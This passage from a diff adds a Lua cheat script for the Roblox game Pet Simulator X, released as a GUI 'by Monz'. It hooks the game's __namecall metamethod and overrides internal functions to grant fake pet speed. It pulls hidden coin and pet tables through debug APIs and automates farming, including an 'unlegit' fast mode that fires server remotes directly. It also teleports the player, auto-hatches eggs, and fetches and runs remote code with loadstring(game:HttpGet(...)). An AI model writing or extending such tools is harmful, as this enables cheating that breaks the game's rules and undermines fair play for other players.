+					SendWebhook()
+				end
+			end
+			print(quantity, reward)
+		end
+		
+	end
+	
+	Library.Network.Fired("Rewards Redeemed"):Connect(function(rewards)
+		RewardsRedeemed(rewards)
+	end)
+	
+	Library.Signal.Fired("Rewards Redeemed"):Connect(function(rewards)
+		RewardsRedeemed(rewards)
+	end)
+
+	local GetCoinsInstance = GetRemoteFunction("Get Coins")
+	local OpenEggInstance = GetRemoteFunction("Buy Egg")
+	-- print(OpenEggInstance, typeof(OpenEggInstance))
+	local metatable = getrawmetatable(game)
+	setreadonly(metatable, false)
+	local oldNamecall = metatable.__namecall
+	
+		metatable.__namecall = function(self, ...)
+			local InstanceMethod = getnamecallmethod()
+			local args = {...}
+
+			if InstanceMethod == "InvokeServer" then
+				if self == OpenEggInstance then
+					LastOpenEggId = args[1]
+					LastOpenEggData = Library.Directory.Eggs[LastOpenEggId]
+					LastHatchSetting = "Normal"
+					
+					if args[2] then 
+						LastHatchSetting = "Triple"
+					end
+					
+					if args[3] then 
+						LastHatchSetting = "Octuple"
+					end
+					
+					coroutine.wrap(function()
+						while true do
+							SaveCustomFlag("CurrentEgg", LastOpenEggId)
+							wait()
+							SaveCustomFlag("CurrentHatchSettings", LastHatchSetting)
+							break
+						end
+					end)()
+				end
+			end
+			
+			return oldNamecall(self, ...)
+		end
+	
+	setreadonly(metatable, true)
+	
+	-- local originalInvokeServer = OpenEggInstance.InvokeServer
+	-- originalInvokeServer = hookfunction(OpenEggInstance.InvokeServer, newcclosure(function(...)
+		-- local args = {...}
+		-- print(args[1])
+		-- -- if self == OpenEggInstance then
+			-- LastOpenEggId = args[1]
+			-- LastOpenEggData = Library.Directory.Eggs[LastOpenEggId]
+			-- LastHatchSetting = "Normal"
+			
+			-- if args[2] then 
+				-- LastHatchSetting = "Triple"
+			-- end
+			
+			-- if args[3] then 
+				-- LastHatchSetting = "Octuple"
+			-- end
+			
+			-- coroutine.wrap(function()
+				-- while true do
+					-- SaveCustomFlag("CurrentEgg", LastOpenEggId)
+					-- wait()
+					-- SaveCustomFlag("CurrentHatchSettings", LastHatchSetting)
+					-- break
+				-- end
+			-- end)()
+		-- -- end
+
+		-- return originalInvokeServer(...)
+	-- end))
+	
+
+	
+	local fastPets = false
+	local Original_HasPower = Library.Shared.HasPower
+	Library.Shared.HasPower = function(pet, powerName) 
+		if fastPets and powerName == "Agility" then 
+			return true, 3
+		end
+		return Original_HasPower(pet, powerName)
+	end
+	
+	local Original_GetPowerDir = Library.Shared.GetPowerDir
+	Library.Shared.GetPowerDir = function(powerName, tier) 
+		if fastPets and powerName == "Agility" then 
+			return  {
+				title = "Agility III", 
+				desc = "Pet moves 50% faster", 
+				value = 20
+			}
+		end
+		return Original_GetPowerDir(powerName, tier)
+	end
+
+	getgenv().SecureMode = true
+	getgenv().DisableArrayfieldAutoLoad = true
+	
+	local Rayfield = nil
+	if isfile("UI/ArrayField.lua") then
+		Rayfield = loadstring(readfile("UI/ArrayField.lua"))()
+	else
+		Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/Rafacasari/ArrayField/main/v2.lua"))()
+	end
+	
+	-- local Rayfield = (isfile("UI/ArrayField.lua") and loadstring(readfile("UI/ArrayField.lua"))()) or loadstring(game:HttpGet("https://raw.githubusercontent.com/Rafacasari/ArrayField/main/v2.lua"))()
+	assert(Rayfield, "Oopps! Rayfield has not been loaded. Maybe try re-joining?") 
+	
+
+	local Window = Rayfield:CreateWindow({
+	   Name = "Pet Simulator GUI | by Monz ",
+	   LoadingTitle = SCRIPT_NAME .. " " .. SCRIPT_VERSION,
+	   LoadingSubtitle = "by Monz",
+	   ConfigurationSaving = {
+		  Enabled = true,
+		  FolderName = "Monz",
+		  FileName = "PetSimulatorX_" .. tostring(LocalPlayer.UserId)
+	   },
+	   OldTabLayout = true
+	})
+	
+	coroutine.wrap(function() 
+		wait(0.5)
+		if not isfile("Monz/AcceptedTerms.txt") then 
+			Window:Prompt({
+				Title = 'Disclaimer',
+				SubTitle = 'Misuse of this script may result in penalties!',
+				Content = "I am not responsible for any harm caused by this tool, use at your own risk.",
+				Actions = {
+					
+					Accept = {
+						Name = "Ok",
+						Callback = function()
+							if not isfolder("Monz") then makefolder("Monz") end
+							writefile("Monz/AcceptedTerms.txt", "true")
+						end,
+						
+					}
+				}
+			})
+		end 
+	
+	end)()
+	
+	
+	function AddCustomFlag(flagName, defaultValue, callback)
+		if Rayfield and Rayfield.Flags and not Rayfield.Flags[flagName] then
+			local newFlag = {
+				CurrentValue = defaultValue
+			}
+			
+			function newFlag:Set(newValue)
+				Rayfield.Flags[flagName].CurrentValue = newValue
+				
+				callback(newValue)
+			end
+			
+			Rayfield.Flags[flagName] = newFlag
+		end
+	end
+	
+	function SaveCustomFlag(flagName, value)
+		if Rayfield and Rayfield.Flags and Rayfield.Flags[flagName] then
+			pcall(function() 
+				Rayfield.Flags[flagName]:Set(value)
+				
+				coroutine.wrap(function()
+					Rayfield.SaveConfiguration()
+				end)()
+			end)
+		end
+	end
+	
+	
+	
+	Library.ChatMsg.New(string.format("Hello, %s! You're running %s %s", LocalPlayer.DisplayName, SCRIPT_NAME, SCRIPT_VERSION), Color3.fromRGB(175, 70, 245))
+	
+	--local mainTab = Window:CreateTab("Main", "12434808810")
+	
+	
+	-- task.spawn(function() 
+		-- while true do 
+			-- stats:Set({Title = "Hello, " .. LocalPlayer.DisplayName, Content = string.format("There are some useful information:\nServer age: %s\n", Library.Functions.TimeString(workspace.DistributedGameTime, true))})
+			-- task.wait(1)
+		-- end
+	-- end)
+	
+	LocalPlayer.PlayerScripts:WaitForChild("Scripts", 10):WaitForChild("Game", 10)
+	
+	
+	local autoFarmTab = Window:CreateTab("Farm", "13075651575", true)
+	local stats = autoFarmTab:CreateParagraph({Title = "Hello, <b><font color=\"#2B699F\">" .. LocalPlayer.DisplayName .. "</font></b>!", Content = "Thanks for using my script! - Monz\nMake sure to join us at <b><font color=\"#2B699F\">https://discord.gg/d2X3XVm7</font></b>"})
+	local autoFarmSection = autoFarmTab:CreateSection("Auto Farm", false, false, "7785988164")
+	local enableAutoFarm = false
+	autoFarmTab:CreateToggle({
+		Name = "Enable Auto-Farm",
+		Info = 'Auto Farm will automatically destroy/farm coins for you, be aware of the risks of abusing it',
+		Flag = "AutoFarm_Enabled",
+		SectionParent = autoFarmSection,
+		CurrentValue = false,
+		Callback = function(Value) 
+			enableAutoFarm = Value
+		end
+	})
+	
+	local AutoFarm_FastMode = false
+	autoFarmTab:CreateToggle({
+		Name = "Fast Mode (unlegit farm)",
+		Flag = "AutoFarm_FastMode", 
+		SectionParent = autoFarmSection,
+		CurrentValue = false,
+		Callback = function(Value) 
+			AutoFarm_FastMode = Value
+		end
+	})
+	
+	local AutoFarm_FarmSpeed = 0.3
+	autoFarmTab:CreateSlider({
+	   Name = "Farm Speed",
+	   Flag = "AutoFarm_FarmSpeed",
+	   SectionParent = autoFarmSection,
+	   Range = {0.05, 2},
+	   Increment = 0.05,
+	   Suffix = "Second(s)",
+	   CurrentValue = 0.3,
+	   Callback = function(Value)
+			AutoFarm_FarmSpeed = Value
+	   end,
+	})
+	
+	local farmMaxDistance = 150
+	autoFarmTab:CreateSlider({
+	   Name = "Farm Max Distance",
+	   Flag = "AutoFarm_MaxDistance",
+	   SectionParent = autoFarmSection,
+	   Range = {10, tonumber(Library.Settings.CoinGrabDistance) or 300},
+	   Increment = 1,
+	   Suffix = "Studs",
+	   CurrentValue = 150,
+	   Callback = function(Value)
+			farmMaxDistance = Value
+	   end,
+	})
+	
+	local farmPreferences = autoFarmTab:CreateSection("Farm Priority", false, true)
+	local farmFocusListText = autoFarmTab:CreateParagraph({Title = "Current Farming", Content = "Nothing"}, farmPreferences)
+
+	local DefaultFarmFocusList = {
+		"Fruits",
+		"Highest Multiplier",
+		"Diamonds",
+		"Lowest Life",
+		"Highest Life",
+		"Nearest",
+		"Longest"
+	}
+	
+	function CalcMultiplier(coinBonus)
+		if not coinBonus then return 0 end
+		local totalMultiplier = 0	
+		if coinBonus.l then
+			
+			for _, v in pairs(coinBonus.l) do
+				pcall(function() 
+					if v.m and tonumber(v.m) then
+						totalMultiplier = totalMultiplier + v.m
+					end
+				end)
+			end
+			
+		end
+		return totalMultiplier
+	end
+	
+
+	local FarmFocusList = {}
+	local FarmFocusListButtons = {}
+	
+	
+	function UpdateFarmFocusUI()
+		local farmingText = ""
+		if not FarmFocusList or #FarmFocusList < 1 then
+			farmingText = "There is nothing on your priority list!\nAdd some by <b>clicking on buttons</b>!"
+		else
+			for i, v in ipairs(FarmFocusList) do 
+				farmingText = farmingText .. (farmingText == "" and "This is your priority list to farm.\nYou can <b>modify it by clicking on buttons</b>!\n\n" or "\n") .. i .. "° - <b>" .. tostring(v) .. "</b>"
+			end
+		end
+		
+		farmFocusListText:Set({Title = "Current Farming", Content = farmingText})
+		
+		for _, button in pairs(FarmFocusListButtons) do 
+			local buttonName = button.Button.Name
+			if buttonName then 
+				if table.find(FarmFocusList, buttonName) then
+					button:Set(nil, "Remove")
+				else
+					button:Set(nil, "Add")
+				end
+			end
+		end
+	end
+	
+
+	
+	for _, focusName in pairs(DefaultFarmFocusList) do 
+		local function UpdateButton(text, interact)
+			if not FarmFocusListButtons[focusName] then return end
+			while true do
+				wait()
+				FarmFocusListButtons[focusName]:Set(text, interact)
+				break
+			end
+		end
+		
+		FarmFocusListButtons[focusName] = autoFarmTab:CreateButton({
+			Name = focusName,
+			SectionParent = farmPreferences,
+			Interact = table.find(FarmFocusList, focusName) and "Remove" or "Add",
+			CurrentValue = false,
+			Callback = function(Value) 
+				if table.find(FarmFocusList, focusName) then
+					table.remove(FarmFocusList, table.find(FarmFocusList, focusName))
+					-- UpdateButton(nil, "Add")
+				else
+					table.insert(FarmFocusList, focusName)
+					-- UpdateButton(nil, "Remove")
+				end
+				
+				
+				
+				coroutine.wrap(function() 
+					while true do 
+						wait()
+						UpdateFarmFocusUI()
+						break
+					end
+				end)
+				
+				SaveCustomFlag("AutoFarm_FarmFocusList", FarmFocusList)
+			end
+		})
+		
+		-- FarmFocusListButtons[focusName]:Disable("Coming soon")
+	end	
+	
+	
+	
+	AddCustomFlag("AutoFarm_FarmFocusList", {}, function(newTable)
+		FarmFocusList = newTable
+		
+		local hasChanges = false
+		
+		for i, v in pairs(FarmFocusList) do 
+			if not table.find(DefaultFarmFocusList, v) then
+				table.remove(FarmFocusList, i)
+				hasChanges = true
+			end
+		end
+		
+		
+		
+		if hasChanges then 
+			coroutine.wrap(function() 
+				wait()
+				SaveCustomFlag("AutoFarm_FarmFocusList", FarmFocusList)
+			end)
+		end
+		
+		UpdateFarmFocusUI()
+	end)
+
+	
+	local farmUtilities = autoFarmTab:CreateSection("Farm Utilities", false, true)
+	local FarmUtilities_CollectDrops = false
+	local FarmUtilities_CurrentOrbs = {} 
+	autoFarmTab:CreateToggle({
+		Name = "Collect Drops",
+		SectionParent = farmUtilities,
+		CurrentValue = false,
+		Flag = "FarmUtilities_CollectDrops", 
+		Callback = function(Value) 
+			FarmUtilities_CollectDrops = Value
+			
+			if Value then
+				table.clear(FarmUtilities_CurrentOrbs)
+				FarmUtilities_CurrentOrbs = {}
+				CollectAllOrbs()
+				CollectAllLootbags()
+			end
+			
+			if not FarmUtilities_CollectDrops then return end
+			task.spawn(function() 
+				
+				while FarmUtilities_CollectDrops do
+					wait(0.05)
+					if not FarmUtilities_CollectDrops then break end
+					if FarmUtilities_CurrentOrbs and #FarmUtilities_CurrentOrbs > 0 then
+						Library.Network.Fire("Claim Orbs", FarmUtilities_CurrentOrbs)
+						table.clear(FarmUtilities_CurrentOrbs)
+						FarmUtilities_CurrentOrbs = {}
+					end
+				end
+				
+			end)
+		end
+	})
+
+	function CollectAllOrbs()			
+		pcall(function() 
+			
+			local OrbsToCollect = {}
+			for orbId, orb in pairs(Library.Things:FindFirstChild("Orbs"):GetChildren()) do
+				if not FarmUtilities_CollectDrops then break end
+				if orbId and orb then
+					table.insert(OrbsToCollect, orb.Name)
+				end
+			end
+			
+			if OrbsToCollect and #OrbsToCollect > 0 and FarmUtilities_CollectDrops then
+				Library.Network.Fire("Claim Orbs", OrbsToCollect)
+			end
+		end)
+	end
+	
+	function CollectAllLootbags()			
+		pcall(function() 
+			for _, lootbag in pairs(Library.Things:FindFirstChild("Lootbags"):GetChildren()) do
+				if not FarmUtilities_CollectDrops then break end
+
+				if lootbag and not lootbag:GetAttribute("Collected") then
+					Library.Network.Fire("Collect Lootbag", lootbag.Name, HumanoidRootPart.Position + Vector3.new(math.random(-0.05, 0.05), math.random(-0.05, 0.05), math.random(-0.05, 0.05)))
+					wait(0.03)
+				end
+			end
+		end)
+	end
+	
+	Library.Things:FindFirstChild("Lootbags").ChildAdded:Connect(function(child) 
+		wait()
+		if FarmUtilities_CollectDrops and child then 
+			Library.Network.Fire("Collect Lootbag", child.Name, HumanoidRootPart.Position + Vector3.new(math.random(-0.05, 0.05), math.random(-0.05, 0.05), math.random(-0.05, 0.05)))
+		end
+	end)
+	
+	Library.Things:FindFirstChild("Orbs").ChildAdded:Connect(function(child) 
+		task.wait()
+		if FarmUtilities_CollectDrops and child then
+			table.insert(FarmUtilities_CurrentOrbs, child.name)
+		end
+	end)
+		
+	autoFarmTab:CreateToggle({
+		Name = "Fast Pets",
+		SectionParent = farmUtilities,
+		CurrentValue = false,
+		Flag = "FarmUtilities_FastPets", 
+		Callback = function(Value) 
+			fastPets = Value
+		end
+	})
+	
+	local instantFall = false
+	autoFarmTab:CreateToggle({
+		Name = "Instant Fall Coins",
+		SectionParent = farmUtilities,
+		CurrentValue = false,
+		Flag = "FarmUtilities_InstantFallCoins", 
+		Callback = function(Value) 
+			instantFall = Value
+		end
+	})
+	
+	local WorldCoins = Library.Things:WaitForChild("Coins")
+
+	WorldCoins.ChildAdded:Connect(function(ch)
+		if instantFall then 
+			ch:SetAttribute("HasLanded", true)
+			ch:SetAttribute("IsFalling", false)
+			
+			local coin = ch:WaitForChild("Coin")
+			coin:SetAttribute("InstantLand", true)
+		end
+	end)
+
+	local areaToFarmSection = autoFarmTab:CreateSection("Areas to Farm", false, true)
+	for w, world in ipairs(AllGameWorlds) do
+		coroutine.wrap(function()
+			if world and world.name then
+				local containsSpawns = false
+				if world.spawns then
+					for i,v in pairs(world.spawns) do containsSpawns = true break end
+				end
+				
+				if containsSpawns then
+					local worldDropdown = autoFarmTab:CreateDropdown({
+						Name = world.name,
+						MultiSelection = true,
+						CurrentOption = {},
+						Flag = "SelectedAreas_" .. world.name,
+						Icon = Library.Directory.Currency[world.mainCurrency].tinyImage,
+						Options = GetAllAreasInWorld(world),
+						SectionParent = areaToFarmSection,
+						Callback = function(Option)
+							
+						end
+					})
+					worldDropdown:Lock("Coming soon!", true)
+				end
+			end
+		end)()
+	end
+	
+	function GetCoinsInArea(area)
+		local coinsInArea = {}
+
+		
+		for _, coin in pairs(WorldCoins:GetChildren()) do 
+			if coin and coin:GetAttribute("Area") and coin:GetAttribute("Area") == area then 
+				table.insert(coinsInArea, coin)
+			end
+		end
+		
+		return coinsInArea
+	end
+	
+
+	
+	function SortCoinsByPriority(coins)
+		local sortedCoins = {}
+		
+		
+		CoinsTable = debug.getupvalue(getsenv(LocalPlayer.PlayerScripts.Scripts.Game.Coins).DestroyAllCoins, 1)
+		
+		for _, coin in pairs(coins) do
+			local coinMesh = coin:FindFirstChild("Coin")
+			local mag = (HumanoidRootPart.Position - coinMesh.Position).magnitude	
+			if CoinsTable[coin.Name] and mag <= math.max(math.min(farmMaxDistance, Library.Settings.CoinGrabDistance), 10) and Library.WorldCmds.HasArea(coin:GetAttribute("Area")) then
+				table.insert(sortedCoins, coin)
+			end
+		end
+	
+	
+		table.sort(sortedCoins, function(coinA, coinB)
+			local a = CoinsTable[coinA.Name]
+			local b = CoinsTable[coinB.Name]
+			
+			local APriority = GetCoinLowestPriority(a, b)
+			local BPriority = GetCoinLowestPriority(b, a)
+			
+			return APriority < BPriority 
+		end)
+			
+		
+		
+		return sortedCoins
+	end
+	
+	function SortCoinsByPriorityFastMode(coins)
+		local sortedCoins = {}
+		
+		
+		for coinId, coin in pairs(coins) do
+			coin.coinId = coinId
+			local mag = (HumanoidRootPart.Position - coin.p).magnitude	
+			if mag <= math.max(math.min(farmMaxDistance, Library.Settings.CoinGrabDistance), 10) and Library.WorldCmds.HasArea(coin.a) then
+				table.insert(sortedCoins, coin)
+			end
+		end
+	
+		table.sort(sortedCoins, function(a, b)
+			local APriority = GetCoinLowestPriority(a, b)
+			local BPriority = GetCoinLowestPriority(b, a)
+			
+			return APriority < BPriority 
+		end)
+		
+		
+		return sortedCoins
+	end
+	
+	function GetCoinLowestPriority(mainCoin, coinToCompare)
+		local coin = Library.Directory.Coins[mainCoin.n]
+		local coinCompare = Library.Directory.Coins[coinToCompare.n]
+		
+		local aMagnitude = (HumanoidRootPart.Position - mainCoin.p).magnitude
+		local bMagnitude = (HumanoidRootPart.Position - coinToCompare.p).magnitude
+		
+		local coinIsFruit = coin.breakSound == "fruit"
+		local coinIsDiamond = coin.currencyType == "Diamonds"
+		local coinIsEaster = coin.currencyType == "Easter Coins"
+		
+		local coinHighestMultiplier = CalcMultiplier(mainCoin.b) > CalcMultiplier(coinToCompare.b)
+		
+		local coinPriority = 9999999
+
+		
+		for priority, priorityName in ipairs(FarmFocusList) do 
+			if priorityName == "Fruits" and coinIsFruit then
+				mainCoin.priority = priorityName 
+				coinPriority = priority
+				break
+			elseif priorityName == "Highest Multiplier" and coinHighestMultiplier then
+				mainCoin.priority = priorityName
+				coinPriority = priority
+				break
+			elseif priorityName == "Diamonds" and coinIsDiamond then
+				mainCoin.priority = priorityName
+				coinPriority = priority
+				break
+			elseif priorityName == "Lowest Life" and coin.health < coinCompare.health then
+				mainCoin.priority = priorityName 
+				coinPriority = priority
+				break
+			elseif priorityName == "Highest Life" and coin.health > coinCompare.health then
+				mainCoin.priority = priorityName 
+				coinPriority = priority
+				break
+			elseif priorityName == "Nearest" and aMagnitude < bMagnitude then
+				mainCoin.priority = priorityName
+				coinPriority = priority
+				break
+			elseif priorityName == "Longest" and aMagnitude > bMagnitude then
+				mainCoin.priority = priorityName
+				coinPriority = priority
+				break
+			elseif priorityName == "Easter Coins" and coinIsEaster then
+				mainCoin.priority = priorityName
+				coinPriority = priority
+				break
+			end
+		end
+		
+		
+		return coinPriority
+	end
+	
+	local petsCurrentlyFarming = {}
+	
+
+	coroutine.wrap(function()
+		while true do 
+				if enableAutoFarm and not ScriptIsCurrentlyBusy then 
+					CoinsTable = debug.getupvalue(getsenv(LocalPlayer.PlayerScripts.Scripts.Game.Coins).DestroyAllCoins, 1)
+					RenderedPets = debug.getupvalue(getsenv(LocalPlayer.PlayerScripts.Scripts.Game.Pets).NetworkUpdate, 1)
+					
+					if AutoFarm_FastMode then 
+
+						local foundCoins = SortCoinsByPriorityFastMode(CoinsTable)
+						local equippedPets = Library.PetCmds.GetEquipped()
+						if equippedPets and #equippedPets > 0 and #foundCoins > 0 then
+							for _, pet in pairs(equippedPets) do
+								local selectedCoin = foundCoins[1]
+								task.spawn(function()
+									Library.Network.Invoke("Join Coin", selectedCoin.coinId, {pet.uid}) 
+									Library.Network.Fire("Farm Coin", selectedCoin.coinId, pet.uid)
+									
+								end)
+								
+								table.remove(foundCoins, 1)
+								task.wait(AutoFarm_FarmSpeed)
+							end
+						end
+					else
+						local equippedPets = Library.PetCmds.GetEquipped()
+						local foundCoins = {}
+
+						for _, ch in ipairs(SortCoinsByPriority(WorldCoins:GetChildren())) do
+							local containsMyPet = false
+							local coin = CoinsTable[ch.Name]
+							local coinMesh = ch:FindFirstChild("Coin")
+							local mag = (HumanoidRootPart.Position - coinMesh.Position).magnitude	
+			
+							for _, pet in pairs(equippedPets) do
+								if coin and coin.pets and table.find(coin.pets, pet.uid) then 
+									containsMyPet = true
+									break
+								end
+							end
+							
+							if not containsMyPet and mag <= math.max(math.min(farmMaxDistance, Library.Settings.CoinGrabDistance), 10) and Library.WorldCmds.HasArea(ch:GetAttribute("Area")) then
+								table.insert(foundCoins, ch)
+							end
+						end
+						
+						
+						for i, pet in pairs(RenderedPets) do 
+							if ScriptIsCurrentlyBusy or not enableAutoFarm or #foundCoins <= 0 then break end
+							if pet.spawned.owner == LocalPlayer and not pet.farming then
+								local coin = foundCoins[1]
+								if coin then 
+									if not coin:FindFirstChild("Pets") then
+										local petsFolder = Instance.new("Folder")
+										petsFolder.Name = "Pets"
+										petsFolder.Parent = coin
+									end
+									
+									-- Legit Mode
+									Library.Signal.Fire("Select Coin", coin, pet)
+
+									table.remove(foundCoins, 1)
+									wait(AutoFarm_FarmSpeed)
+								end
+
+							end
+							
+						end
+					end
+				end
+			wait(0.1)
+		end	
+	end)()
+	
+	
+	
+	function IsEggUnlocked(eggId)
+		local egg = Library.Directory.Eggs[eggId]
+		local saveData = Library.Save.Get()
+		if egg.areaRequired then
+			if not Library.WorldCmds.HasArea(egg.area) then
+				return false
+			end
+		end
+		
+		if egg.eggRequired ~= "" then
+			if egg.eggRequired ~= eggId then
+				if not IsEggUnlocked(egg.eggRequired) then
+					return false
+				end
+			end
+		end
+		
+		if egg.eggRequiredOpenAmount > 0 then
+			if egg.eggRequired ~= "" then
+				local eggsHatched = (IsHardcore and saveData.Hardcore.EggsOpened or saveData.EggsOpened)[egg.eggRequired]
+				if eggsHatched then
+					if eggsHatched < egg.eggRequiredOpenAmount then
+						return false
+					end
+				else
+					return false
+				end
+			end
+		end
+		
+		if eggId == "Dominus Egg" then	
+			if IsHardcore and not saveData.Hardcore.OwnsDominusGate then return false end
+			if not IsHardcore and not saveData.OwnsDominusGate then return false end
+		elseif eggId == "Hacker Egg" or eggId == "Hacker Golden Egg" then
+			if IsHardcore and not saveData.Hardcore.OwnsHackerGate then return false end
+			if not IsHardcore and not saveData.OwnsHackerGate then return false end
+		end
+		
+		return true
+	end
+	
+	function HatchEgg(eggId, tripleHatch, octupleHatch, teleportToEgg) 
+		if ScriptIsCurrentlyBusy then return false, "Script is currently busy!" end
+		
+		if not eggId or eggId == "None" then return false, "No egg provided!" end
+		local eggToHatch = Library.Directory.Eggs[eggId]
+		if not eggToHatch then return false, "Didn't found this egg!" end
+		
+		if tripleHatch == nil then tripleHatch = false end	
+		if octupleHatch == nil then  octupleHatch = false end
+		
+		if not eggToHatch.hatchable or eggToHatch.disabled then return false, "This is egg is not available!" end
+		if not IsEggUnlocked(eggId) then return false, "This egg is not unlocked yet!" end
+		
+		local eggArea = Library.Directory.Areas[eggToHatch.area]
+		if eggArea then
+			if teleportToEgg and Library.WorldCmds.Get() ~= eggArea.world then 
+				Library.WorldCmds.Load(eggArea.world)
+				wait(0.25)
+			elseif not teleportToEgg and Library.WorldCmds.Get() ~= eggArea.world then return false, "You're not in the right world!" end
+			
+			local mapEgg = nil
+			
+			for i,v in pairs(Library.WorldCmds.GetAllEggs()) do 
+				if v:GetAttribute("ID") and v:GetAttribute("ID") == eggId then 
+					mapEgg = v
+					break
+				end
+			end
+			
+			if not mapEgg then return false, "Didn't found the egg in map!" end
+			
+			local isNearEgg = Library.LocalPlayer:DistanceFromCharacter(mapEgg.PrimaryPart.CFrame.p) <= 30
+			
+			if teleportToEgg and not isNearEgg then 
+				HumanoidRootPart.CFrame = CFrame.new(mapEgg.PrimaryPart.CFrame.p) + (mapEgg.PrimaryPart.CFrame.RightVector * 10)
+				wait(0.25)
+			elseif not teleportToEgg and not isNearEgg then return false, "You're too far from the egg!" end
+		end
+
+		return Library.Network.Invoke("Buy Egg", eggId, tripleHatch, octupleHatch)
+	end
+	
+	-- local easterEventTab = Window:CreateTab("Easter Event", "13075572975", true)
+	-- local easterEventSection = easterEventTab:CreateSection("Easter Event", true)
+	-- easterEventTab:CreateButton({
+		-- Name = "Teleport to Easter Isle",
+		-- Callback = function()
+			-- if Library.WorldCmds.Get() ~= "Spawn" then 
+				-- if not Library.WorldCmds.Load("Spawn") then return end
+			-- end
+			-- wait(0.25)
+			
+			-- local areaTeleport = Library.WorldCmds.GetMap().Teleports:FindFirstChild("Easter")
+			-- if areaTeleport then 
+				-- Character:PivotTo(areaTeleport.CFrame + areaTeleport.CFrame.UpVector * (Humanoid.HipHeight + HumanoidRootPart.Size.Y / 2))
+			-- end	
+		-- end
+	-- })
+	
+	-- local Easter_AutoEggHunt = false
+	-- local isEggHuntHappening = false
+	-- local eggHuntTimeSeed = 0
+	-- local lastEggHuntSeed = 0
+	
+	-- task.spawn(function() 
+		-- task.wait(1)
+		-- local checkEggHuntSeed = Library.Network.Invoke("Easter Egg Hunt: Get Time Seed")
+		-- if checkEggHuntSeed and checkEggHuntSeed and checkEggHuntSeed > 0 and os.time() >= checkEggHuntSeed and os.time() < checkEggHuntSeed + (60 * 60) then 
+			-- isEggHuntHappening = true
+			-- eggHuntTimeSeed = checkEggHuntSeed
+			-- lastEggHuntSeed = 0
+		-- end
+	-- end)
+	
+	
+	-- local easterEventAutoEggHunt = easterEventTab:CreateToggle({
+		-- Name = "Auto Egg Hunt",
+		-- CurrentValue = false,
+		-- Flag = "Easter_AutoEggHunt",
+		-- Callback = function(value) 
+			-- Easter_AutoEggHunt = value
+			-- lastEggHuntSeed = 0
+			
+			-- if not value then return end
+			
+			-- local checkEggHuntSeed = Library.Network.Invoke("Easter Egg Hunt: Get Time Seed")
+			-- if checkEggHuntSeed and checkEggHuntSeed and checkEggHuntSeed > 0 and os.time() >= checkEggHuntSeed and os.time() < checkEggHuntSeed + (60 * 60) then 
+				-- isEggHuntHappening = true
+				-- eggHuntTimeSeed = checkEggHuntSeed
+				-- lastEggHuntSeed = 0
+			-- end
+			
+			-- wait()
+			-- task.spawn(function() 
+				-- while Easter_AutoEggHunt do
+					-- local saveData = Library.Save.Get()
+					-- if isEggHuntHappening and eggHuntTimeSeed > 0 and lastEggHuntSeed == 0 then
+						-- if not (saveData and saveData.Easter2023.FoundEggs and saveData.Easter2023.FoundEggs[tostring(eggHuntTimeSeed)] and #saveData.Easter2023.FoundEggs[tostring(eggHuntTimeSeed)] >= 100) then		
+							-- if ScriptIsCurrentlyBusy then 
+								-- while ScriptIsCurrentlyBusy do wait() end
+								-- ScriptIsCurrentlyBusy = true
+								-- wait(1)
+							-- end
+							
+							-- ScriptIsCurrentlyBusy = true
+							-- CurrentWorld = Library.WorldCmds.Get()		
+							-- CurrentPosition = HumanoidRootPart.CFrame
+			
+							-- for i, world in ipairs(AllGameWorlds) do
+								-- if not Easter_AutoEggHunt then break end
+								-- if not world.requiredArea or Library.WorldCmds.HasArea(world.requiredArea) then
+									
+									-- if Library.WorldCmds.Get() ~= world.name then
+										-- Library.WorldCmds.Load(world.name)
+									-- end
+									
+									-- for i,v in pairs(Library.WorldCmds.GetMap():WaitForChild("EasterEggs"):GetChildren()) do
+										-- if not Easter_AutoEggHunt then break end
+										-- if v:GetAttribute("Enabled") then	
+											-- task.spawn(function()
+												-- local success, errorMessage = Library.Network.Invoke("Easter Egg Hunt: Claim", v.Name, (v:GetAttribute("TextureIDX")))
+												-- if not success then print(errorMessage) end
+											-- end)
+											-- wait(0.05)
+										-- end
+										
+									-- end
+								-- end
+							-- end
+							
+							-- wait(5)
+							-- TeleportBack()
+							-- wait(1)
+							-- ScriptIsCurrentlyBusy = false
+						-- end
+						-- lastEggHuntSeed = eggHuntTimeSeed
+					-- end
+					
+					-- wait(5)
+				-- end
+			-- end)
+		-- end
+	-- })
+	
+	
+	-- Library.Network.Fired("Easter Egg Hunt: End"):Connect(function()
+		-- isEggHuntHappening = false
+		-- eggHuntTimeSeed = 0
+		-- lastEggHuntSeed = 0
+	-- end)
+	
+	-- Library.Network.Fired("Easter Egg Hunt: Start"):Connect(function(eggHuntData)
+		-- isEggHuntHappening = true
+		-- eggHuntTimeSeed = Library.Network.Invoke("Easter Egg Hunt: Get Time Seed")
+		-- lastEggHuntSeed = 0
+	-- end)
+
+
+	
+	
+	local eggTab = Window:CreateTab("Eggs", "13075637275", true)
+	local hatchingSection = eggTab:CreateSection("Egg Hatching", false)
+	local eggInfo = eggTab:CreateParagraph({Title = "Information", Content = "Buy some egg in-game and it will be automatically selected!\nSelected Egg: %s\nMode: %s\nQuantity Hatched: %s\nQuantity Remaining: %s\n25x Insane Luck: %s\n\n\n\naaa"}, hatchingSection)
+	
+	local LastOpenEggId = "None"
+	AddCustomFlag("CurrentEgg", "None", function(newValue) 
+		LastOpenEggId = newValue
+	end)
+	
+	local LastOpenEggData = nil
+	local LastHatchSetting = "Normal"
+	AddCustomFlag("CurrentHatchSettings", "Normal", function(newValue) 
+		LastHatchSetting = newValue
+	end)
+	
+	local EnableAutoHatch = false
+	eggTab:CreateToggle({
+		Name = "Auto Hatch",
+		Flag = "AutoHatch_Enabled",
+		SectionParent = hatchingSection,
+		Callback = function(Value) 
+			EnableAutoHatch = Value
+			if EnableAutoHatch then 
+				coroutine.wrap(function() 
+					while EnableAutoHatch do 
+						wait(math.random(3, 3.1))
+						if not EnableAutoHatch then break end
+						local tripleHatch = false
+						local octupleHatch = false
+						if LastHatchSetting == "Triple" then tripleHatch = true end
+						if LastHatchSetting == "Octuple" then octupleHatch = true end
+						--print("Trying to hatch: ", LastOpenEggId, tripleHatch, octupleHatch)
+						local successHatch, errorHatch = HatchEgg(LastOpenEggId, tripleHatch, octupleHatch, true)
+						if not successHatch then print(errorHatch or "Opss, failed to hatch!") end
+					end
+				end)()
+			end
+		end
+	})
+	
+	local Original_OpenEgg = nil
+	eggTab:CreateToggle({
+		Name = "Skip Egg Animation", 
+		Flag = "AutoFarm_SkipEggAnimation",
+		SectionParent = hatchingSection,
+		Callback = function(Value) 
+			if Value then SkipEggAnimation() else RestoreEggAnimation() end
+		end
+	})
+		
+
